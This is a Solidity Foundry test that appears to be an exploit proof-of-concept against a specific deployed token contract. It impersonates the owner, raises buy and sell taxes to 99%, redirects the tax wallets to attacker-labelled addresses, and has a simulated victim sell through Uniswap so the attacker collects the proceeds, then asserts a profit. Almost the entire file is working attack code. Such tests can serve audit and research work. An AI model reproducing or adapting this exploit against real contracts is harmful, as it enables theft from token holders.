pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for CoinToken to access uniswapV2Router02
interface ICoinToken {
    function owner() external view returns (address);
    function setBuyTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function setSellTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function setTaxWallets(address dev, address marketing, address charity) external;
    function enableTax() external;
    function triggerTax() external;
    function uniswapV2Router02() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function exclude(address account) external;
    function removeExclude(address account) external;
}

// Minimal IUniswapV2Router02 interface for swap
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    address private attackerMarketing;
    address private attackerDev;
    address private attackerCharity;
    address private contractOwner;
    address private victimAddress;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create attacker-controlled addresses for tax wallets
        attackerMarketing = address(0x111);
        attackerDev = address(0x222);
        attackerCharity = address(0x333);

        // Label addresses for clarity
        vm.label(attackerMarketing, "AttackerMarketing");
        vm.label(attackerDev, "AttackerDev");
        vm.label(attackerCharity, "AttackerCharity");

        // Get the contract owner
        contractOwner = ICoinToken(TARGET).owner();

        // Impersonate the owner for the entire exploit
        vm.startPrank(contractOwner);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Set taxes to 99% for all categories (not 100% to allow swap to proceed)
        ICoinToken(TARGET).setBuyTax(99, 0, 0, 0);
        ICoinToken(TARGET).setSellTax(99, 0, 0, 0);

        // Step 2: Set tax wallets to attacker addresses
        ICoinToken(TARGET).setTaxWallets(attackerDev, attackerMarketing, attackerCharity);

        vm.stopPrank();

        // Step 3: Create a victim user with tokens and ETH
        address victim = address(0x444);
        vm.label(victim, "Victim");

        // Give victim ETH for gas and potential swap costs
        deal(victim, 10 ether);

        // Give victim some tokens directly using deal() cheatcode
        deal(TARGET, victim, 10_000 * 10**18);

        // Step 4: Victim trades tokens to generate sell tax
        // First, victim approves router to spend tokens
        vm.prank(victim);
        ICoinToken(TARGET).approve(ICoinToken(TARGET).uniswapV2Router02(), 1_000 * 10**18);

        // Get router address
        address routerAddress = ICoinToken(TARGET).uniswapV2Router02();
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        // Victim swaps tokens for ETH (sell) - this will incur 99% tax
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // Record balances before swap
        uint256 beforeMarketing = attackerMarketing.balance;
        uint256 beforeDev = attackerDev.balance;
        uint256 beforeCharity = attackerCharity.balance;

        vm.prank(victim);
        router.swapExactTokensForETH(
            1_000 * 10**18,
            0,  // Accept any amount of ETH (with 99% tax, will get very little)
            path,
            victim,
            block.timestamp
        );

        // Step 5: Trigger tax collection as owner
        vm.prank(contractOwner);
        ICoinToken(TARGET).triggerTax();

        // Step 6: Check balances increased
        uint256 afterMarketing = attackerMarketing.balance;
        uint256 afterDev = attackerDev.balance;
        uint256 afterCharity = attackerCharity.balance;

        uint256 totalProfit = (afterMarketing - beforeMarketing) + 
                             (afterDev - beforeDev) + 
                             (afterCharity - beforeCharity);

        assertGt(totalProfit, 0, "Attacker should have received ETH from taxes");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

